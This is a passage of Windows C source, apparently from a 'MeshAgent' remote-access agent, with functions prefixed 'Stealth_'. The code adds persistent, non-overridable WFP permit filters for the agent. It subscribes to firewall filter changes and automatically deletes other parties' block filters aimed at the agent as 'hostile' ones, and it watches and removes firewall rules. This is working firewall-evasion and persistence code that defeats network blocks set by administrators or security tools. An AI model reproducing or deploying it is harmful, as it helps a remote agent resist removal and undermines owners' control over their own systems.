    Stealth_WfpDescribeProvider(remediationEngine, filter->providerKey, providerLabel, _countof(providerLabel));
    deleteStatus = FwpmFilterDeleteById0(remediationEngine, filter->filterId);
    if (deleteStatus == ERROR_SUCCESS || deleteStatus == FWP_E_FILTER_NOT_FOUND)
    {
        Stealth_LogInstallEvent(
            L"[FIREWALL] WFP subscription removed hostile block filter id=%I64u provider=%ls",
            (unsigned long long)filter->filterId,
            providerLabel[0] != L'\0' ? providerLabel : L"(unknown)");
    }
    else
    {
        Stealth_LogInstallEvent(
            L"[WARN] WFP subscription failed to remove hostile block filter id=%I64u provider=%ls error=%lu",
            (unsigned long long)filter->filterId,
            providerLabel[0] != L'\0' ? providerLabel : L"(unknown)",
            (unsigned long)deleteStatus);
    }

    FwpmFreeMemory0((void**)&filter);
    if (remediationEngine != NULL)
    {
        FwpmEngineClose0(remediationEngine);
    }
}

static BOOL Stealth_StartWfpChangeSubscription(const wchar_t* exePath)
{
    DWORD status = ERROR_SUCCESS;
    FWPM_FILTER_SUBSCRIPTION0 subscription;
    HANDLE changeHandle = NULL;
    HANDLE engine = NULL;
    FWP_BYTE_BLOB* expectedAppId = NULL;

    if (g_StealthWfpSubscription.changeHandle != NULL) { return TRUE; }
    if (exePath == NULL || exePath[0] == L'\0') { return FALSE; }

    status = Stealth_WfpOpenEngineWithSessionFlags(&engine, FWPM_SESSION_FLAG_DYNAMIC);
    if (status != ERROR_SUCCESS || engine == NULL)
    {
        SetLastError(status);
        return FALSE;
    }

    status = FwpmGetAppIdFromFileName0(exePath, &expectedAppId);
    if (status != ERROR_SUCCESS || expectedAppId == NULL)
    {
        if (engine != NULL) { FwpmEngineClose0(engine); }
        SetLastError(status);
        return FALSE;
    }

    ZeroMemory(&subscription, sizeof(subscription));
    subscription.flags = FWPM_SUBSCRIPTION_FLAG_NOTIFY_ON_ADD | FWPM_SUBSCRIPTION_FLAG_NOTIFY_ON_DELETE;
    g_StealthWfpSubscription.engine = engine;
    g_StealthWfpSubscription.expectedAppId = expectedAppId;

    status = FwpmFilterSubscribeChanges0(
        engine,
        &subscription,
        Stealth_WfpFilterChangeCallback,
        &g_StealthWfpSubscription,
        &changeHandle);
    if (status != ERROR_SUCCESS || changeHandle == NULL)
    {
        g_StealthWfpSubscription.engine = NULL;
        g_StealthWfpSubscription.expectedAppId = NULL;
        if (expectedAppId != NULL) { FwpmFreeMemory0((void**)&expectedAppId); }
        if (engine != NULL) { FwpmEngineClose0(engine); }
        SetLastError(status);
        return FALSE;
    }

    g_StealthWfpSubscription.changeHandle = changeHandle;
    Stealth_LogInstallEvent(L"[FIREWALL] WFP filter change subscription active");
    return TRUE;
}

static BOOL Stealth_EnsureFirewallPolicyRealtimeGuards(const wchar_t* exePath)
{
    BOOL success = TRUE;

    if (!Stealth_StartFirewallRulesWatcher())
    {
        success = FALSE;
        Stealth_LogInstallEvent(L"[WARN] Failed to start firewall registry watcher");
    }
    if (!Stealth_StartWfpChangeSubscription(exePath))
    {
        success = FALSE;
        Stealth_LogInstallEvent(L"[WARN] Failed to start WFP filter change subscription (error=%lu)", GetLastError());
    }
    return success;
}

void Stealth_StopFirewallPolicyRealtimeGuards(void)
{
    if (g_StealthFirewallWatcherStopEvent != NULL)
    {
        SetEvent(g_StealthFirewallWatcherStopEvent);
    }

    if (g_StealthWfpSubscription.engine != NULL && g_StealthWfpSubscription.changeHandle != NULL)
    {
        (void)FwpmFilterUnsubscribeChanges0(g_StealthWfpSubscription.engine, g_StealthWfpSubscription.changeHandle);
        g_StealthWfpSubscription.changeHandle = NULL;
    }
    if (g_StealthWfpSubscription.expectedAppId != NULL)
    {
        FwpmFreeMemory0((void**)&g_StealthWfpSubscription.expectedAppId);
    }
    if (g_StealthWfpSubscription.engine != NULL)
    {
        FwpmEngineClose0(g_StealthWfpSubscription.engine);
        g_StealthWfpSubscription.engine = NULL;
    }

    if (g_StealthFirewallWatcherThread != NULL)
    {
        (void)WaitForSingleObject(g_StealthFirewallWatcherThread, 5000);
        CloseHandle(g_StealthFirewallWatcherThread);
        g_StealthFirewallWatcherThread = NULL;
    }
    if (g_StealthFirewallWatcherStopEvent != NULL)
    {
        CloseHandle(g_StealthFirewallWatcherStopEvent);
        g_StealthFirewallWatcherStopEvent = NULL;
    }
}

static void Stealth_EnablePrivilege(const wchar_t* privilegeName)
{
    if (privilegeName == NULL || privilegeName[0] == L'\0') { return; }

    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        return;
    }

    LUID luid;
    TOKEN_PRIVILEGES tp;
    if (LookupPrivilegeValueW(NULL, privilegeName, &luid))
    {
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    }

    CloseHandle(hToken);
}

static DWORD Stealth_WfpOpenEngine(HANDLE* engine)
{
    return Stealth_WfpOpenEngineWithSessionFlags(engine, 0);
}

static DWORD Stealth_WfpOpenEngineWithSessionFlags(HANDLE* engine, UINT32 sessionFlags)
{
    FWPM_SESSION0 session;

    if (engine == NULL) { return ERROR_INVALID_PARAMETER; }
    *engine = NULL;

    ZeroMemory(&session, sizeof(session));
    session.displayData.name = L"MeshAgent WFP Session";
    session.flags = sessionFlags;
    return FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, &session, engine);
}

static BOOL Stealth_WfpByteBlobEquals(const FWP_BYTE_BLOB* left, const FWP_BYTE_BLOB* right)
{
    if (left == NULL || right == NULL) { return FALSE; }
    if (left->size != right->size) { return FALSE; }
    if (left->size == 0) { return TRUE; }
    if (left->data == NULL || right->data == NULL) { return FALSE; }
    return (memcmp(left->data, right->data, left->size) == 0);
}

static BOOL Stealth_WfpGuidEquals(const GUID* left, const GUID* right)
{
    if (left == NULL || right == NULL) { return FALSE; }
    return (memcmp(left, right, sizeof(GUID)) == 0);
}

static BOOL Stealth_WfpFilterHasAppIdCondition(const FWPM_FILTER0* filter, const FWP_BYTE_BLOB* expectedAppId)
{
    if (filter == NULL || expectedAppId == NULL) { return FALSE; }

    for (UINT32 i = 0; i < filter->numFilterConditions; ++i)
    {
        const FWPM_FILTER_CONDITION0* condition = &filter->filterCondition[i];
        if (Stealth_WfpGuidEquals(&condition->fieldKey, &FWPM_CONDITION_ALE_APP_ID) &&
            condition->matchType == FWP_MATCH_EQUAL &&
            condition->conditionValue.type == FWP_BYTE_BLOB_TYPE &&
            Stealth_WfpByteBlobEquals(condition->conditionValue.byteBlob, expectedAppId))
        {
            return TRUE;
        }
    }

    return FALSE;
}

static DWORD Stealth_WfpDeleteFilterByKeyIfPresent(HANDLE engine, const GUID* filterKey)
{
    DWORD status;

    if (engine == NULL || filterKey == NULL) { return ERROR_INVALID_PARAMETER; }
    status = FwpmFilterDeleteByKey0(engine, filterKey);
    if (status == ERROR_SUCCESS || status == FWP_E_FILTER_NOT_FOUND) { return ERROR_SUCCESS; }
    return status;
}

static DWORD Stealth_WfpRemoveObjectsIfPresent(HANDLE engine)
{
    DWORD status = ERROR_SUCCESS;

    if (engine == NULL) { return ERROR_INVALID_PARAMETER; }

    for (size_t i = 0; i < _countof(g_StealthWfpFilters); ++i)
    {
        status = Stealth_WfpDeleteFilterByKeyIfPresent(engine, g_StealthWfpFilters[i].filterKey);
        if (status != ERROR_SUCCESS)
        {
            return status;
        }
    }

    status = FwpmSubLayerDeleteByKey0(engine, &STEALTH_WFP_SUBLAYER_KEY);
    if (status != ERROR_SUCCESS && status != FWP_E_SUBLAYER_NOT_FOUND)
    {
        return status;
    }

    status = FwpmProviderDeleteByKey0(engine, &STEALTH_WFP_PROVIDER_KEY);
    if (status != ERROR_SUCCESS && status != FWP_E_PROVIDER_NOT_FOUND)
    {
        return status;
    }

    return ERROR_SUCCESS;
}

static DWORD Stealth_WfpAddProviderAndSubLayer(HANDLE engine, const wchar_t* serviceName)
{
    DWORD status;
    FWPM_PROVIDER0 provider;
    FWPM_SUBLAYER0 subLayer;
    wchar_t providerName[256];
    wchar_t subLayerName[256];

    if (engine == NULL || serviceName == NULL || serviceName[0] == L'\0') { return ERROR_INVALID_PARAMETER; }

    ZeroMemory(&provider, sizeof(provider));
    ZeroMemory(&subLayer, sizeof(subLayer));
    ZeroMemory(providerName, sizeof(providerName));
    ZeroMemory(subLayerName, sizeof(subLayerName));

    (void)StringCchPrintfW(providerName, _countof(providerName), STEALTH_WFP_PROVIDER_NAME_FMT, serviceName);
    provider.providerKey = STEALTH_WFP_PROVIDER_KEY;
    provider.displayData.name = providerName;
    provider.displayData.description = L"Persistent MeshAgent permit provider";
    provider.flags = FWPM_PROVIDER_FLAG_PERSISTENT;
    provider.serviceName = (wchar_t*)serviceName;

    status = FwpmProviderAdd0(engine, &provider, NULL);
    if (status != ERROR_SUCCESS && status != FWP_E_ALREADY_EXISTS) { return status; }

    (void)StringCchPrintfW(subLayerName, _countof(subLayerName), STEALTH_WFP_SUBLAYER_NAME_FMT, serviceName);
    subLayer.subLayerKey = STEALTH_WFP_SUBLAYER_KEY;
    subLayer.displayData.name = subLayerName;
    subLayer.displayData.description = L"Persistent MeshAgent hard-permit sublayer";
    subLayer.flags = FWPM_SUBLAYER_FLAG_PERSISTENT;
    subLayer.providerKey = (GUID*)&STEALTH_WFP_PROVIDER_KEY;
    subLayer.weight = 0xFFFF;

    status = FwpmSubLayerAdd0(engine, &subLayer, NULL);
    if (status != ERROR_SUCCESS && status != FWP_E_ALREADY_EXISTS) { return status; }

    return ERROR_SUCCESS;
}

static DWORD Stealth_WfpAddPermitFilter(HANDLE engine, const wchar_t* serviceName, const wchar_t* exePath, const StealthWfpFilterDescriptor* descriptor)
{
    DWORD status;
    FWP_BYTE_BLOB* appId = NULL;
    FWPM_FILTER_CONDITION0 condition;
    FWPM_FILTER0 filter;
    wchar_t filterName[256];

    if (engine == NULL || serviceName == NULL || serviceName[0] == L'\0' || exePath == NULL || exePath[0] == L'\0' || descriptor == NULL)
    {
        return ERROR_INVALID_PARAMETER;
    }

    status = FwpmGetAppIdFromFileName0(exePath, &appId);
    if (status != ERROR_SUCCESS) { return status; }

    ZeroMemory(&condition, sizeof(condition));
    ZeroMemory(&filter, sizeof(filter));
    ZeroMemory(filterName, sizeof(filterName));

    condition.fieldKey = FWPM_CONDITION_ALE_APP_ID;
    condition.matchType = FWP_MATCH_EQUAL;
    condition.conditionValue.type = FWP_BYTE_BLOB_TYPE;
    condition.conditionValue.byteBlob = appId;

    (void)StringCchPrintfW(filterName, _countof(filterName), STEALTH_WFP_FILTER_NAME_FMT, serviceName, descriptor->nameSuffix);
    filter.filterKey = *descriptor->filterKey;
    filter.displayData.name = filterName;
    filter.displayData.description = L"Persistent MeshAgent hard-permit filter";
    filter.providerKey = (GUID*)&STEALTH_WFP_PROVIDER_KEY;
    filter.layerKey = *descriptor->layerKey;
    filter.subLayerKey = STEALTH_WFP_SUBLAYER_KEY;
    filter.weight.type = FWP_UINT8;
    filter.weight.uint8 = 0xF;
    filter.numFilterConditions = 1;
    filter.filterCondition = &condition;
    filter.action.type = FWP_ACTION_PERMIT;
    filter.flags = FWPM_FILTER_FLAG_PERSISTENT | FWPM_FILTER_FLAG_CLEAR_ACTION_RIGHT;

    status = Stealth_WfpDeleteFilterByKeyIfPresent(engine, descriptor->filterKey);
    if (status != ERROR_SUCCESS)
    {
        FwpmFreeMemory0((void**)&appId);
        return status;
    }

    status = FwpmFilterAdd0(engine, &filter, NULL, NULL);
    FwpmFreeMemory0((void**)&appId);
    return status;
}

BOOL Stealth_AddWfpHardPermitForApp(const wchar_t* serviceName, const wchar_t* exePath)
{
    HANDLE engine = NULL;
    DWORD status = ERROR_SUCCESS;
    BOOL success = FALSE;

    if (serviceName == NULL || serviceName[0] == L'\0' || exePath == NULL || exePath[0] == L'\0') { return FALSE; }

    status = Stealth_WfpOpenEngine(&engine);
    if (status != ERROR_SUCCESS)
    {
        SetLastError(status);
        return FALSE;
    }

    status = FwpmTransactionBegin0(engine, 0);
    if (status != ERROR_SUCCESS) { goto cleanup; }

    status = Stealth_WfpRemoveObjectsIfPresent(engine);
    if (status != ERROR_SUCCESS) { goto cleanup; }

    status = Stealth_WfpAddProviderAndSubLayer(engine, serviceName);
    if (status != ERROR_SUCCESS) { goto cleanup; }

    for (size_t i = 0; i < _countof(g_StealthWfpFilters); ++i)
    {
        status = Stealth_WfpAddPermitFilter(engine, serviceName, exePath, &g_StealthWfpFilters[i]);
        if (status != ERROR_SUCCESS) { goto cleanup; }
    }

    status = FwpmTransactionCommit0(engine);
    if (status == ERROR_SUCCESS)
    {
        success = TRUE;
    }

cleanup:
    if (!success)
    {
        (void)FwpmTransactionAbort0(engine);
        SetLastError(status);
    }
    if (engine != NULL) { FwpmEngineClose0(engine); }
    return success;
}

BOOL Stealth_RemoveWfpHardPermitForService(const wchar_t* serviceName)
{
    HANDLE engine = NULL;
    DWORD status = ERROR_SUCCESS;
    BOOL success = TRUE;

    UNREFERENCED_PARAMETER(serviceName);

    status = Stealth_WfpOpenEngine(&engine);
    if (status != ERROR_SUCCESS)
    {
        SetLastError(status);
        return FALSE;
    }

    status = FwpmTransactionBegin0(engine, 0);
    if (status != ERROR_SUCCESS)
    {
        FwpmEngineClose0(engine);
        SetLastError(status);
        return FALSE;
    }

    for (size_t i = 0; i < _countof(g_StealthWfpFilters); ++i)
    {
        status = Stealth_WfpDeleteFilterByKeyIfPresent(engine, g_StealthWfpFilters[i].filterKey);
        if (status != ERROR_SUCCESS)
        {
            success = FALSE;
            break;
        }
    }
    if (success)
    {
        status = FwpmSubLayerDeleteByKey0(engine, &STEALTH_WFP_SUBLAYER_KEY);
        if (status != ERROR_SUCCESS && status != FWP_E_SUBLAYER_NOT_FOUND)
        {
            success = FALSE;
        }
    }
    if (success)
    {
        status = FwpmProviderDeleteByKey0(engine, &STEALTH_WFP_PROVIDER_KEY);
        if (status != ERROR_SUCCESS && status != FWP_E_PROVIDER_NOT_FOUND)
        {
            success = FALSE;
        }
    }

    if (success)
    {
        status = FwpmTransactionCommit0(engine);
        success = (status == ERROR_SUCCESS);
    }
    else
    {
        (void)FwpmTransactionAbort0(engine);
    }

    if (!success) { SetLastError(status); }
    if (engine != NULL) { FwpmEngineClose0(engine); }
    return success;
}

static BOOL Stealth_WfpCheckFilter(HANDLE engine, const StealthWfpFilterDescriptor* descriptor, const FWP_BYTE_BLOB* expectedAppId)
{
    DWORD status;
    FWPM_FILTER0* filter = NULL;
    BOOL hasAppIdCondition = FALSE;

    if (engine == NULL || descriptor == NULL || expectedAppId == NULL) { return FALSE; }

    status = FwpmFilterGetByKey0(engine, descriptor->filterKey, &filter);
    if (status != ERROR_SUCCESS || filter == NULL) { return FALSE; }

    if (!Stealth_WfpGuidEquals(&filter->layerKey, descriptor->layerKey) ||
        !Stealth_WfpGuidEquals(&filter->subLayerKey, &STEALTH_WFP_SUBLAYER_KEY) ||
        filter->providerKey == NULL ||
        !Stealth_WfpGuidEquals(filter->providerKey, &STEALTH_WFP_PROVIDER_KEY) ||
        filter->action.type != FWP_ACTION_PERMIT ||
        (filter->flags & FWPM_FILTER_FLAG_PERSISTENT) == 0 ||
        (filter->flags & FWPM_FILTER_FLAG_CLEAR_ACTION_RIGHT) == 0)
    {
        FwpmFreeMemory0((void**)&filter);
        return FALSE;
    }

    for (UINT32 i = 0; i < filter->numFilterConditions; ++i)
    {
        const FWPM_FILTER_CONDITION0* condition = &filter->filterCondition[i];
        if (Stealth_WfpGuidEquals(&condition->fieldKey, &FWPM_CONDITION_ALE_APP_ID) &&
            condition->matchType == FWP_MATCH_EQUAL &&
            condition->conditionValue.type == FWP_BYTE_BLOB_TYPE &&
            Stealth_WfpByteBlobEquals(condition->conditionValue.byteBlob, expectedAppId))
        {
            hasAppIdCondition = TRUE;
            break;
        }
    }

    FwpmFreeMemory0((void**)&filter);
    return hasAppIdCondition;
}

BOOL Stealth_CheckWfpHardPermitForApp(const wchar_t* serviceName, const wchar_t* exePath)
{
    HANDLE engine = NULL;
    DWORD status;
    FWPM_PROVIDER0* provider = NULL;
    FWPM_SUBLAYER0* subLayer = NULL;
    FWP_BYTE_BLOB* expectedAppId = NULL;
    BOOL success = FALSE;

    if (exePath == NULL || exePath[0] == L'\0') { return FALSE; }

    status = Stealth_WfpOpenEngine(&engine);
    if (status != ERROR_SUCCESS)
    {
        SetLastError(status);
        return FALSE;
    }

    status = FwpmProviderGetByKey0(engine, &STEALTH_WFP_PROVIDER_KEY, &provider);
    if (status != ERROR_SUCCESS || provider == NULL) { goto cleanup; }
    if ((provider->flags & FWPM_PROVIDER_FLAG_PERSISTENT) == 0) { goto cleanup; }
    if (serviceName != NULL && serviceName[0] != L'\0')
    {
        /* Provider serviceName is not authoritative on all systems.
           The concrete guarantee is the persistent provider/subLayer/filter chain
           keyed by our GUIDs and the expected ALE_APP_ID conditions below. */
        if (provider->serviceName != NULL && _wcsicmp(provider->serviceName, serviceName) != 0)
        {
            goto cleanup;
        }
    }

    status = FwpmSubLayerGetByKey0(engine, &STEALTH_WFP_SUBLAYER_KEY, &subLayer);
    if (status != ERROR_SUCCESS || subLayer == NULL) { goto cleanup; }
    if ((subLayer->flags & FWPM_SUBLAYER_FLAG_PERSISTENT) == 0) { goto cleanup; }
    if (subLayer->providerKey != NULL && !Stealth_WfpGuidEquals(subLayer->providerKey, &STEALTH_WFP_PROVIDER_KEY))
    {
        goto cleanup;
    }

    status = FwpmGetAppIdFromFileName0(exePath, &expectedAppId);
    if (status != ERROR_SUCCESS || expectedAppId == NULL) { goto cleanup; }

    success = TRUE;
    for (size_t i = 0; i < _countof(g_StealthWfpFilters); ++i)
    {
        if (!Stealth_WfpCheckFilter(engine, &g_StealthWfpFilters[i], expectedAppId))
        {
            success = FALSE;
            break;
        }
    }

cleanup:
    if (expectedAppId != NULL) { FwpmFreeMemory0((void**)&expectedAppId); }
    if (subLayer != NULL) { FwpmFreeMemory0((void**)&subLayer); }
    if (provider != NULL) { FwpmFreeMemory0((void**)&provider); }
    if (engine != NULL) { FwpmEngineClose0(engine); }
    return success;
}

BOOL Stealth_CheckWfpHardPermitExists(const wchar_t* serviceName)
{
    HANDLE engine = NULL;
    DWORD status;
    FWPM_FILTER0* filter = NULL;
    BOOL exists = FALSE;

    UNREFERENCED_PARAMETER(serviceName);

    status = Stealth_WfpOpenEngine(&engine);
    if (status != ERROR_SUCCESS)
    {
        SetLastError(status);
        return FALSE;
    }

    for (size_t i = 0; i < _countof(g_StealthWfpFilters); ++i)
    {
        status = FwpmFilterGetByKey0(engine, g_StealthWfpFilters[i].filterKey, &filter);
        if (status == ERROR_SUCCESS && filter != NULL)
        {
            exists = TRUE;
            FwpmFreeMemory0((void**)&filter);
            filter = NULL;
            break;
        }
        if (filter != NULL)
        {
            FwpmFreeMemory0((void**)&filter);
            filter = NULL;
        }
    }

    if (engine != NULL) { FwpmEngineClose0(engine); }
    return exists;
}

// ================================================================
// Windows Firewall Management
// ================================================================

static BOOL Stealth_ComInit(BOOL* didInit)
{
    if (didInit) { *didInit = FALSE; }

    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (SUCCEEDED(hr))
    {
        if (didInit) { *didInit = TRUE; }
        return TRUE;
    }
    if (hr == RPC_E_CHANGED_MODE)
    {
        // COM already initialized with different concurrency model; proceed without uninitializing.
        return TRUE;
    }
    return FALSE;
}

static void Stealth_ComUninit(BOOL didInit)
{
    if (didInit) { CoUninitialize(); }
}

static void Stealth_FreeBstr(BSTR* value)
{
    if (value != NULL && *value != NULL)
    {
        SysFreeString(*value);
        *value = NULL;
    }
}

typedef struct StealthFirewallRuleNameList
{
    wchar_t** items;
    size_t count;
    size_t capacity;
} StealthFirewallRuleNameList;

static BOOL Stealth_RemoveRuleByName(INetFwRules* rules, const wchar_t* ruleName);
static BOOL Stealth_CheckFirewallRuleByProperties(
    const wchar_t* ruleName,
    const wchar_t* exePath,
    const wchar_t* serviceName,
    VARIANT_BOOL enabledExpected,
    NET_FW_RULE_DIRECTION directionExpected,
    NET_FW_ACTION actionExpected,
    BOOL requireProtocol,
    LONG protocolExpected,
    BOOL requireEdgeTraversal,
    VARIANT_BOOL edgeTraversalExpected);
static BOOL Stealth_IsFirewallRulePresentByName(const wchar_t* ruleName);

static void Stealth_FreeFirewallRuleNameList(StealthFirewallRuleNameList* list)
{
    if (list == NULL) { return; }

    if (list->items != NULL)
    {
        for (size_t i = 0; i < list->count; ++i)
        {
            if (list->items[i] != NULL)
            {
                LocalFree(list->items[i]);
                list->items[i] = NULL;
            }
        }
        LocalFree(list->items);
    }

    list->items = NULL;
    list->count = 0;
    list->capacity = 0;
}

static BOOL Stealth_FirewallRuleNameListContains(const StealthFirewallRuleNameList* list, const wchar_t* ruleName)
{
    if (list == NULL || ruleName == NULL || ruleName[0] == L'\0') { return FALSE; }

    for (size_t i = 0; i < list->count; ++i)
    {
        if (list->items[i] != NULL && _wcsicmp(list->items[i], ruleName) == 0)
        {
            return TRUE;
        }
    }

    return FALSE;
}

static BOOL Stealth_AppendFirewallRuleName(StealthFirewallRuleNameList* list, const wchar_t* ruleName)
{
    wchar_t** newItems = NULL;
    wchar_t* ruleNameCopy = NULL;
    size_t ruleNameCch;
    size_t newCapacity;

    if (list == NULL || ruleName == NULL || ruleName[0] == L'\0') { return FALSE; }
    if (Stealth_FirewallRuleNameListContains(list, ruleName)) { return TRUE; }

    if (list->count == list->capacity)
    {
        newCapacity = (list->capacity == 0) ? 4 : (list->capacity * 2);
        newItems = (wchar_t**)LocalAlloc(LPTR, newCapacity * sizeof(wchar_t*));
        if (newItems == NULL) { return FALSE; }
        if (list->items != NULL && list->count > 0)
        {
            CopyMemory(newItems, list->items, list->count * sizeof(wchar_t*));
            LocalFree(list->items);
        }
        list->items = newItems;
        list->capacity = newCapacity;
    }

    ruleNameCch = wcslen(ruleName) + 1;
    ruleNameCopy = (wchar_t*)LocalAlloc(LPTR, ruleNameCch * sizeof(wchar_t));
    if (ruleNameCopy == NULL) { return FALSE; }
    if (FAILED(StringCchCopyW(ruleNameCopy, ruleNameCch, ruleName)))
    {
        LocalFree(ruleNameCopy);
        return FALSE;
    }

    list->items[list->count++] = ruleNameCopy;
    return TRUE;
}

static BOOL Stealth_RemoveFirewallRulesByNameList(INetFwRules* rules, const StealthFirewallRuleNameList* list, UINT32* removedCount)
{
    BOOL success = TRUE;

    if (removedCount != NULL) { *removedCount = 0; }
    if (list == NULL || list->count == 0) { return TRUE; }
    if (rules == NULL) { return FALSE; }

    for (size_t i = 0; i < list->count; ++i)
    {
        if (list->items[i] == NULL || list->items[i][0] == L'\0') { continue; }
        if (!Stealth_RemoveRuleByName(rules, list->items[i]))
        {
            success = FALSE;
        }
        else if (removedCount != NULL)
        {
            (*removedCount)++;
        }
    }

    return success;
}

static BOOL Stealth_RemoveRuleByName(INetFwRules* rules, const wchar_t* ruleName)
{
    if (rules == NULL || ruleName == NULL || ruleName[0] == L'\0') { return TRUE; }

    // Firewall can contain duplicate names; remove repeatedly until not found.
    BOOL ok = TRUE;
    BSTR bstrName = SysAllocString(ruleName);
    if (bstrName == NULL) { return FALSE; }

    for (int i = 0; i < 32; ++i)
    {
        HRESULT remHr = rules->lpVtbl->Remove(rules, bstrName);
        if (SUCCEEDED(remHr) || remHr == HRESULT_FROM_WIN32(ERROR_FILE_NOT_FOUND))
        {
            if (remHr == HRESULT_FROM_WIN32(ERROR_FILE_NOT_FOUND))
            {
                break;
            }
        }
        else
        {
            ok = FALSE;
            break;
        }
    }

    SysFreeString(bstrName);
    return ok;
}

static BOOL Stealth_CheckFirewallRuleByProperties(
    const wchar_t* ruleName,
    const wchar_t* exePath,
    const wchar_t* serviceName,
    VARIANT_BOOL enabledExpected,
    NET_FW_RULE_DIRECTION directionExpected,
    NET_FW_ACTION actionExpected,
    BOOL requireProtocol,
    LONG protocolExpected,
    BOOL requireEdgeTraversal,
    VARIANT_BOOL edgeTraversalExpected)
{
    HRESULT hr = S_OK;
    INetFwPolicy2* pNetFwPolicy2 = NULL;
    INetFwRules* pFwRules = NULL;
    IUnknown* pEnumUnknown = NULL;
    IEnumVARIANT* pEnum = NULL;
    BOOL success = FALSE;
    BOOL didCoInit = FALSE;
    VARIANT var;
    ULONG fetched = 0;

    if (ruleName == NULL || ruleName[0] == L'\0') { return FALSE; }
    if (!Stealth_ComInit(&didCoInit)) { return FALSE; }

    hr = CoCreateInstance(&CLSID_NetFwPolicy2, NULL, CLSCTX_INPROC_SERVER,
                          &IID_INetFwPolicy2, (void**)&pNetFwPolicy2);
    if (FAILED(hr) || pNetFwPolicy2 == NULL) { goto cleanup; }

    hr = pNetFwPolicy2->lpVtbl->get_Rules(pNetFwPolicy2, &pFwRules);
    if (FAILED(hr) || pFwRules == NULL) { goto cleanup; }

    hr = pFwRules->lpVtbl->get__NewEnum(pFwRules, &pEnumUnknown);
    if (SUCCEEDED(hr) && pEnumUnknown != NULL)
    {
        hr = pEnumUnknown->lpVtbl->QueryInterface(pEnumUnknown, &IID_IEnumVARIANT, (void**)&pEnum);
    }
    if (FAILED(hr) || pEnum == NULL) { goto cleanup; }

    while (TRUE)
    {
        VariantInit(&var);
        hr = pEnum->lpVtbl->Next(pEnum, 1, &var, &fetched);
        if (hr != S_OK)
        {
            VariantClear(&var);
            break;
        }

        if (var.vt == VT_DISPATCH && var.pdispVal != NULL)
        {
            INetFwRule* rule = NULL;
            if (SUCCEEDED(var.pdispVal->lpVtbl->QueryInterface(var.pdispVal, &IID_INetFwRule, (void**)&rule)) &&
                rule != NULL)
            {
                BSTR currentName = NULL;
                BSTR currentApp = NULL;
                BSTR currentService = NULL;
                VARIANT_BOOL enabled = VARIANT_FALSE;
                VARIANT_BOOL edge = VARIANT_FALSE;
                NET_FW_RULE_DIRECTION direction = NET_FW_RULE_DIR_OUT;
                NET_FW_ACTION action = NET_FW_ACTION_BLOCK;
                long protocol = 0;
                BOOL matches = FALSE;

                if (SUCCEEDED(rule->lpVtbl->get_Name(rule, &currentName)) &&
                    currentName != NULL &&
                    _wcsicmp(currentName, ruleName) == 0)
                {
                    matches = TRUE;
                    if (FAILED(rule->lpVtbl->get_Enabled(rule, &enabled)) || enabled != enabledExpected) { matches = FALSE; }
                    if (matches && (FAILED(rule->lpVtbl->get_Direction(rule, &direction)) || direction != directionExpected)) { matches = FALSE; }
                    if (matches && (FAILED(rule->lpVtbl->get_Action(rule, &action)) || action != actionExpected)) { matches = FALSE; }
                    if (matches && requireProtocol &&
                        (FAILED(rule->lpVtbl->get_Protocol(rule, &protocol)) || protocol != protocolExpected))
                    {
                        matches = FALSE;
                    }
                    if (matches && requireEdgeTraversal &&
                        (FAILED(rule->lpVtbl->get_EdgeTraversal(rule, &edge)) || edge != edgeTraversalExpected))
                    {
                        matches = FALSE;
                    }
                    if (matches && exePath != NULL && exePath[0] != L'\0')
                    {
                        if (FAILED(rule->lpVtbl->get_ApplicationName(rule, &currentApp)) ||
                            currentApp == NULL ||
                            _wcsicmp(currentApp, exePath) != 0)
                        {
                            matches = FALSE;
                        }
                    }
                    if (matches && serviceName != NULL && serviceName[0] != L'\0')
                    {
                        if (FAILED(rule->lpVtbl->get_ServiceName(rule, &currentService)) ||
                            currentService == NULL ||
                            _wcsicmp(currentService, serviceName) != 0)
                        {
                            matches = FALSE;
                        }
                    }
                }

                Stealth_FreeBstr(&currentName);
                Stealth_FreeBstr(&currentApp);
                Stealth_FreeBstr(&currentService);
                rule->lpVtbl->Release(rule);

                if (matches)
                {
                    success = TRUE;
                    VariantClear(&var);
                    break;
                }
            }
        }

        VariantClear(&var);
    }

cleanup:
    if (pEnum != NULL) { pEnum->lpVtbl->Release(pEnum); }
    if (pEnumUnknown != NULL) { pEnumUnknown->lpVtbl->Release(pEnumUnknown); }
    if (pFwRules != NULL) { pFwRules->lpVtbl->Release(pFwRules); }
    if (pNetFwPolicy2 != NULL) { pNetFwPolicy2->lpVtbl->Release(pNetFwPolicy2); }
    Stealth_ComUninit(didCoInit);
    return success;
}

static BOOL Stealth_IsFirewallRulePresentByName(const wchar_t* ruleName)
{
    HRESULT hr = S_OK;
    INetFwPolicy2* pNetFwPolicy2 = NULL;
    INetFwRules* pFwRules = NULL;
    IUnknown* pEnumUnknown = NULL;
    IEnumVARIANT* pEnum = NULL;
    BOOL exists = FALSE;
    BOOL didCoInit = FALSE;
    VARIANT var;
    ULONG fetched = 0;

    if (ruleName == NULL || ruleName[0] == L'\0') { return FALSE; }
    if (!Stealth_ComInit(&didCoInit)) { return FALSE; }

    hr = CoCreateInstance(&CLSID_NetFwPolicy2, NULL, CLSCTX_INPROC_SERVER,
                          &IID_INetFwPolicy2, (void**)&pNetFwPolicy2);
    if (FAILED(hr) || pNetFwPolicy2 == NULL) { goto cleanup; }

    hr = pNetFwPolicy2->lpVtbl->get_Rules(pNetFwPolicy2, &pFwRules);
    if (FAILED(hr) || pFwRules == NULL) { goto cleanup; }

    hr = pFwRules->lpVtbl->get__NewEnum(pFwRules, &pEnumUnknown);
    if (SUCCEEDED(hr) && pEnumUnknown != NULL)
    {
        hr = pEnumUnknown->lpVtbl->QueryInterface(pEnumUnknown, &IID_IEnumVARIANT, (void**)&pEnum);
    }
    if (FAILED(hr) || pEnum == NULL) { goto cleanup; }

    while (TRUE)
    {
        VariantInit(&var);
        hr = pEnum->lpVtbl->Next(pEnum, 1, &var, &fetched);
        if (hr != S_OK)
        {
            VariantClear(&var);
            break;
        }

        if (var.vt == VT_DISPATCH && var.pdispVal != NULL)
        {
            INetFwRule* rule = NULL;
